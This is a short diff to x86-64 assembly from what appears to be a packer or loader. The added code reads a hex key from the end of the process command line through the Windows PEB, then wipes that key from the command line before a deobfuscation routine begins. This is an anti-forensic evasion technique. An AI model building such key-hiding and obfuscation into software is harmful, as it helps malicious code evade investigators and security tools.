@@ -60,15 +60,17 @@ section         PEMAIN01
 #
         mov rax, gs:[0x60]
         mov rax, [rax+0x20]
+        push rax
         mov cx, [rax+0x70]
         mov rax, [rax+0x78]
         movzx rcx, cx
+        push rcx
         add rax, rcx
         sub rax, 32
+        push rax
         mov cx, 16
         xor r8, r8
         xor rdx, rdx
-        xor r8b, r8b
         .convert_loop:
         mov dx, [rax]
         sub dx, '0'
@@ -88,11 +90,19 @@ section         PEMAIN01
         .allow_add:
         shl r8, 4
         add r8, rdx
-        mov [rax], r8b
         add rax, 2
         dec cx
         cmp cx, 0
         jne .convert_loop
+        pop rdi
+        pop rcx
+        pop rdx
+        sub cx, 34
+        mov [rdx+0x70], cx
+        xor eax, eax
+        sub rdi, 2
+        mov ecx, 34
+        rep stosb
 
 #
 # DEOBFUSCATE START
